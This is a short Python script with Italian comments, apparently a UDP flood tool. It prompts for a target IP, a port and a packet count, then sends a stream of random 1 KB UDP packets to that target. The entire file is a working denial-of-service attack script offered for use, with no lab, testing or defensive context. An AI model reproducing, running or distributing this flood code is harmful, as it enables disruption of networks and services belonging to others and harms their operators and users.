import socket
import random

def udp_flood():
    # Input dei parametri dall'utente
    target_ip = input("Inserisci l'IP del target: ")
    target_port = int(input("Inserisci la porta UDP (es. 80): "))
    packet_count = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))

    # Creazione del socket UDP (SOCK_DGRAM)
    # AF_INET indica l'utilizzo di IPv4
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generazione di 1 KB di dati casuali (1024 bytes)
    bytes_payload = random._urandom(1024)

    print(f"\nInizio invio di {packet_count} pacchetti a {target_ip}:{target_port}...")

    sent = 0
    try:
        for i in range(packet_count):
            sock.sendto(bytes_payload, (target_ip, target_port))
            sent += 1
            if sent % 100 == 0:
                print(f"Pacchetti inviati: {sent}")
        
        print(f"\nCompletato! Totale pacchetti inviati: {sent}")
    
    except KeyboardInterrupt:
        print("\nProcesso interrotto dall'utente.")
    except Exception as e:
        print(f"\nErrore durante l'invio: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    udp_flood()